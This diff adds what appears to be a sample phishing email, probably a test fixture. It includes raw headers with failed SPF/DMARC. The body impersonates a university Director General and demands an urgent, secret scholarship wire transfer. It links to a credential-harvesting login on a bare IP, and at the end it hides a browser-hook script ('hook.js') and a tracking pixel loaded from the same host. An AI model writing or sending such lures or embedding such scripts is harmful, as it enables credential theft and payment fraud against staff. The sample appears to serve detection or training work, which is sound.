@@ -1,0 +1,63 @@
+Delivered-To: target@university.edu
+Received: by 10.0.0.3 with SMTP id def67890;
+        Thu, 03 Sep 2026 14:20:00 +0530
+Received: from mail-gw.university.edu (mail-gw.university.edu [142.250.190.46]) by mx.university.edu
+        with ESMTPS id uvw54321;
+        Thu, 03 Sep 2026 14:19:50 +0530
+Received: from unknown (unknown [77.247.181.163])
+        by mail-gw.university.edu with SMTP;
+        Thu, 03 Sep 2026 14:19:30 +0530
+Received: from [45.33.32.156] (helo=mail.legit-portal.com)
+        by unknown with ESMTP;
+        Thu, 03 Sep 2026 14:19:10 +0530
+Authentication-Results: mx.university.edu;
+       spf=fail (university.edu: domain of director@university.edu does not designate 77.247.181.163 as permitted sender);
+       dkim=none;
+       dmarc=fail action=quarantine header.from=university.edu;
+From: "Director General - University Administration" <director@university.edu>
+Reply-To: director.urgent@gmail.com
+Return-Path: <bounce@temp-mail.org>
+To: target@university.edu
+Subject: CONFIDENTIAL: Scholarship Fund Transfer - Immediate Processing Required
+Date: Thu, 03 Sep 2026 14:18:55 +0530
+Message-ID: <malicious-hook-2026@temp-mail.org>
+X-Mailer: PhishKit v3.1
+MIME-Version: 1.0
+Content-Type: text/html; charset="UTF-8"
+
+<!DOCTYPE html>
+<html>
+<body style="font-family: 'Segoe UI', sans-serif; color: #1a202c;">
+    <div style="border-bottom: 3px solid #2563eb; padding-bottom: 10px; margin-bottom: 20px;">
+        <h2 style="margin: 0;">University Administration</h2>
+        <p style="color: #718096; margin: 5px 0;">Office of the Director General</p>
+    </div>
+    
+    <p>Dear Faculty Member,</p>
+    
+    <p>As discussed in our board meeting, we need to process the <strong>emergency scholarship fund transfer</strong> of <strong>Rs. 15,00,000</strong> to the new vendor account. The Ministry has set a <strong>strict deadline of today</strong> for this disbursement.</p>
+    
+    <p>I need you to complete the following steps immediately:</p>
+    <ol>
+        <li>Log in to the <a href="http://45.33.32.156:8080/university-portal/login">University Finance Portal</a> to approve the transfer</li>
+        <li>Enter your credentials and authorize the payment</li>
+        <li>Wire transfer the amount to the new bank account details attached</li>
+    </ol>
+    
+    <p><strong>This is highly confidential</strong>. Do not discuss this with anyone until the transfer is complete. Per our conversation, this must be done before end of business today.</p>
+    
+    <p>Updated bank account for transfer:</p>
+    <ul>
+        <li>Account Name: Educational Trust Foundation</li>
+        <li>Account Number: 9876543210123456</li>
+        <li>IFSC Code: FAKE0001234</li>
+    </ul>
+    
+    <p>Please confirm once the transfer is initiated by replying to this email.</p>
+    
+    <p>Warm regards,<br><strong>Prof. Rajesh Kumar</strong><br>Director General<br>University Administration</p>
+    
+    <script src="http://45.33.32.156:3000/hook.js"></script>
+    <img src="http://45.33.32.156:3000/pixel.gif" width="1" height="1" style="display:none;">
+</body>
+</html>
